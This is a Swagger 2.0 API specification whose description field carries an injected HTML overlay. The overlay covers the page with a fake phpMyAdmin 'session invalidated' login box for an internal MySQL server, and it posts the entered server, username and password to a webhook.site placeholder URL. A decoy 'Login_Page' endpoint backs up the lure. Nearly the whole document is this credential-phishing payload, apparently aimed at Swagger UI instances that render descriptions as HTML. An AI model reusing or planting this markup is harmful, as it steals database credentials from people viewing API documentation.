swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#e8ecef;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:380px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="background:#3a5169;color:#fff;padding:12px 18px;font-family:Arial;display:flex;justify-content:space-between;"><span><strong>phpMyAdmin</strong> 5.2.1</span><span style="font-size:12px;opacity:.8;">mysql-db01.internal</span></div><div style="padding:28px 26px;font-family:Arial;"><div style="font-size:13px;color:#6c757d;margin-bottom:18px;">Session invalidated. Please log in again to access the database server.</div><form action="https://webhook.site/REPLACE-ME" method="post"><label style="font-size:12px;color:#495057;">Server</label><br><input type="text" name="server" value="mysql-db01.internal:3306" style="width:100%;padding:10px;border:1px solid #adb5bd;border-radius:3px;box-sizing:border-box;margin:4px 0 12px;font-size:14px;font-family:monospace;"><label style="font-size:12px;color:#495057;">Username</label><br><input type="text" name="user" placeholder="root" style="width:100%;padding:10px;border:1px solid #adb5bd;border-radius:3px;box-sizing:border-box;margin:4px 0 12px;font-size:14px;"><label style="font-size:12px;color:#495057;">Password</label><br><input type="password" name="pass" style="width:100%;padding:10px;border:1px solid #adb5bd;border-radius:3px;box-sizing:border-box;margin:4px 0 16px;font-size:14px;"><button type="submit" style="padding:10px 34px;background:#3a5169;color:#fff;border:none;border-radius:3px;font-size:14px;cursor:pointer;">Go</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
